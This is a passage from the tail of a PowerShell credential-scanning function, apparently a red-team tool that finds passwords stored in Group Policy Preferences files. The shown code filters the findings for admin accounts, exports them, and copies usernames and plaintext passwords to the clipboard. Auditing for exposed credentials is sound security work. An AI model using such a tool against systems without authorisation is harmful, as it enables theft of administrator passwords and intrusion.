                            (New-TimeSpan -Start $ChangedDate -End (Get-Date)).Days -le 30
                        } catch { $false }
                    } else { $false }
                }
            }
            'Admins' { $AllResults | Where-Object { $_.UserName -match 'admin|administrator|root' } }
            default { $AllResults }
        }

        Write-Progress -Activity "Analysis Complete" -Completed

        # Display results
        Show-ColoredResults -Results $FilteredResults
        Write-Summary -Results $FilteredResults

        # Handle export
        if ($ExportPath) {
            Export-Results -Results $FilteredResults -Path $ExportPath
        }

        # Handle clipboard copy
        if ($CopyToClipboard) {
            $AdminPasswords = $FilteredResults | Where-Object { $_.Severity -eq 'CRITICAL' }
            if ($AdminPasswords) {
                $ClipboardText = $AdminPasswords | Select-Object UserName, Password, File | 
                                ConvertTo-Csv -NoTypeInformation | Out-String
                $ClipboardText | Set-Clipboard
                Write-ColorOutput "INFO: Critical findings copied to clipboard" -ForegroundColor Yellow
            }
        }

        # Handle GridView
        if ($GridView -and $FilteredResults.Count -gt 0) {
            $FilteredResults | Select-Object Severity, UserName, Password, PasswordLength, PasswordStrength, 
                IsCommonPassword, PasswordAge, AccountType, GPOName, GPODomain, Changed, 
                @{Name='FileName';Expression={Split-Path $_.File -Leaf}}, File | 
                Out-GridView -Title "GPP Password Scan Results - $($FilteredResults.Count) findings - Red Team Analysis"
        }

        return $FilteredResults
    }
    catch { 
        Write-ColorOutput "ERROR: Fatal error: $_" -ForegroundColor Red
        Write-Error $Error[0]
    }
    finally {
        Write-Progress -Activity "Scan Complete" -Completed
    }
}